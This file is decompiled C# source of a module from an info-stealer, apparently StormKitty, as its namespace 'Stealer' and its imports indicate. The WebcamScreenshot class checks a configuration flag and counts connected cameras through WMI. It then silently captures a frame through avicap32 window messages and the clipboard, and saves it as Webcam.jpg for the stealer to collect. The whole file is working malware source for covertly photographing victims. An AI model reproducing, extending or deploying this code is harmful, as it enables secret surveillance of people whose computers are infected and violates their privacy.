﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000029 RID: 41
	internal sealed class WebcamScreenshot
	{
		// Token: 0x060000B4 RID: 180
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x060000B5 RID: 181
		[DllImport("user32")]
		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

		// Token: 0x060000B6 RID: 182 RVA: 0x000062E4 File Offset: 0x000044E4
		private static int GetConnectedCamerasCount()
		{
			int num = 0;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						num++;
					}
				}
			}
			catch
			{
				Console.WriteLine("GetConnectedCamerasCount : Query failed");
			}
			return num;
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00006370 File Offset: 0x00004570
		public static bool Make(string sSavePath)
		{
			if (Config.WebcamScreenshot != "1")
			{
				return false;
			}
			if (WebcamScreenshot.GetConnectedCamerasCount() != 1)
			{
				return false;
			}
			try
			{
				Clipboard.Clear();
				WebcamScreenshot.Handle = WebcamScreenshot.capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1034U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1074U, 0, 0);
				Thread.Sleep(WebcamScreenshot.delay);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1084U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1054U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1035U, 0, 0);
				Image image = (Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
				Clipboard.Clear();
				image.Save(sSavePath + "\\Webcam.jpg", ImageFormat.Jpeg);
				image.Dispose();
				Counter.WebcamScreenshot = true;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return false;
			}
			return true;
		}

		// Token: 0x04000078 RID: 120
		private static IntPtr Handle;

		// Token: 0x04000079 RID: 121
		private static int delay = 3000;
	}
}
